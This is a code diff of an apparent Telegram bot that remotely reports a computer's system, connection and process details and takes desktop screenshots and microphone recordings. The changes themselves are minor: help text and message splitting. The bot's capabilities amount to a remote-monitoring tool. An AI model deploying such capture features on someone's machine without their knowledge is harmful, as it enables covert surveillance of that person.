@@ -24,13 +24,14 @@ async def system_check(message: types.Message):
 
 @dp.message_handler(commands="help")
 async def support(message: types.Message):
+    # todo change audio support after remake function
     await message.answer(f'\nCommand List:\n'
                          f'/check - Checking System Status\n'
                          f'/pc_info - System characteristics\n'
                          f'/con_info - Connection characteristics\n'
                          f'/proc_info - List of running processes\n'
                          f'/screen - Desktop screenshot\n'
-                         f'/audio - Record audio from a voice recorder for a minute\n'
+                         f'/audio - Record audio from a voice recorder for a 5 second\n'
                          f'/exit - Shutting down the program before reboot\n')
 
 
@@ -49,7 +50,11 @@ async def send_connection_info(message: types.Message):
 @dp.message_handler(commands="proc_info")
 async def send_process_info(message: types.Message):
     result = module.GetInfo().get_process()
-    await message.answer(result)
+    if len(result) > 4096:
+        for x in range(0, len(result), 4096):
+            await message.answer(result[x:x + 4096])
+    else:
+        await message.answer(result)
 
 
 @dp.message_handler(commands="screen")
